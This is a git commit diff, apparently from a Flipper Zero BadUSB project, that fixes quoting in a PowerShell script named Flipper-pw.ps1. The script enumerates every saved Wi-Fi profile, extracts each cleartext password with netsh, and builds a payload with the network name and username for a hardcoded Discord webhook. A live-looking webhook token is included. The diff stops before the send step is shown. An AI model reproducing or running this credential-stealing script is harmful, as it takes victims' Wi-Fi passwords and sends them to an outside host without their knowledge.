9275227aa26ece3d7f8a321f9d72c57a233ef1ee
Tips <tim.doppelreiter@gmail.com>
2023-12-25 19:54:56 +0100

    Fixed missing double apostrophes

--- Flipper-pw.ps1
+++ Flipper-pw.ps1
@@ -1,7 +1,7 @@
 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value
     $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
-    $discord = https://discord.com/api/webhooks/1188797313347493889/c2t6GjI0i8jpbE3RPer-E5DiuJQ8E6M3Vwnvder_3QI8l6a4XUt-mUHQtYzV_E9ToFMZ
+    $discord = "https://discord.com/api/webhooks/1188797313347493889/c2t6GjI0i8jpbE3RPer-E5DiuJQ8E6M3Vwnvder_3QI8l6a4XUt-mUHQtYzV_E9ToFMZ"
 
 	$Body = @{
 		'username' = $env:username + " | " + [string]$wlan
